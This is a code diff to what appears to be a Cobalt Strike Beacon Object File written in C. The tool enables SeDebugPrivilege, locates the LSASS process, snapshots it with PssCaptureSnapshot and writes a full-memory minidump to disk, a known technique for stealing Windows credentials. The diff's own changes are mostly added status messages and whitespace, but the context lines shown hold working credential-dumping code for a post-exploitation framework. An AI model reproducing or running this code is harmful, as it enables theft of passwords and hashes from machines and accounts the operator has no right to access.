@@ -25,7 +25,7 @@ WINBASEAPI	 HANDLE			WINAPI KERNEL32$GetCurrentProcess(VOID);
 WINBASEAPI       HMODULE		WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
 DECLSPEC_IMPORT  BOOL			WINAPI KERNEL32$Process32Next(HANDLE, void*);
 DECLSPEC_IMPORT  BOOL			WINAPI KERNEL32$Process32First(HANDLE, void*);
-WINBASEAPI	 STDAPI_(DWORD) 	WINAPI KERNEL32$PssFreeSnapshot(HANDLE, HPSS);
+WINBASEAPI	 STDAPI_(DWORD)         WINAPI KERNEL32$PssFreeSnapshot(HANDLE, HPSS);
 WINBASEAPI       FARPROC		WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
 WINBASEAPI       HANDLE			WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
 DECLSPEC_IMPORT  HANDLE			WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
@@ -65,6 +65,7 @@ BOOL EnableSeDebug(void) {
 	return TRUE;
 }
 
+
 int GetProcId(void) {
 
 	PROCESSENTRY32 entry;
@@ -97,15 +98,22 @@ void go(char* argc, int len) {
 
 	// Enable Debug privs
 	EnableSeDebug();
+
+	BeaconPrintf(CALLBACK_OUTPUT, "[*] Enable SeDebugPrivilege \n");
 	
 	DWORD PSSFlags = (PSS_CAPTURE_FLAGS)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
 
+
 	int pid = GetProcId();
+
 	
 	if (pid < 0) {
 		BeaconPrintf(CALLBACK_ERROR, "Could not find lsass pid : 0x%lx\n", KERNEL32$GetLastError());
+
 	}
 	
+	BeaconPrintf(CALLBACK_OUTPUT, "[*] Lsass PID is: %d\n", pid);
+
 	// Open up a handle to LSASS
 	HANDLE processHandle = KERNEL32$OpenProcess(
 		PROCESS_ALL_ACCESS,
@@ -129,10 +137,12 @@ void go(char* argc, int len) {
 		BeaconPrintf(CALLBACK_ERROR, "Error! Unable to createfile. Error: 0x%lx\n", KERNEL32$GetLastError());
 	}
 
+
 	HANDLE snapshotHandle = NULL;
 	MINIDUMP_CALLBACK_INFORMATION CallbackInfo = { 0 };
 	CallbackInfo.CallbackRoutine = MDWDCallbackRoutine;
 	CallbackInfo.CallbackParam = NULL;
+
 
 	// Get SnapShot Handle for LSASS
 
@@ -140,21 +150,23 @@ void go(char* argc, int len) {
 
 	if (snapshotHandle == INVALID_HANDLE_VALUE) {
 
-		BeaconPrintf(CALLBACK_ERROR, "Failed to Obtain SnapShot on LSASS : 0x%lx\n\n", KERNEL32$GetLastError());
+		BeaconPrintf(CALLBACK_ERROR, "Failed to Obtain SnapShot of LSASS : 0x%lx\n\n", KERNEL32$GetLastError());
 	}
 	else {
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] SnapShot Obtained \n");
+		BeaconPrintf(CALLBACK_OUTPUT, "[*] Obtained SnapShot Handle of LSASS \n");
 	}
+
 
 	// MiniDump on SnapShot Handle
 	BOOL Dumped = DBGHELP$MiniDumpWriteDump(snapshotHandle, pid, outFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
 
 	if (Dumped) {
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] Dump Created \n");
+		BeaconPrintf(CALLBACK_OUTPUT, "[*] Memory Dump File Created \n");
 	}
 	else {
 		BeaconPrintf(CALLBACK_ERROR, "Error Dumping LSASS Memory: 0x%lx\n", KERNEL32$GetLastError());
 	}
+
 
 	// Close Handles
 	KERNEL32$PssFreeSnapshot(KERNEL32$GetCurrentProcess, (HPSS)snapshotHandle);
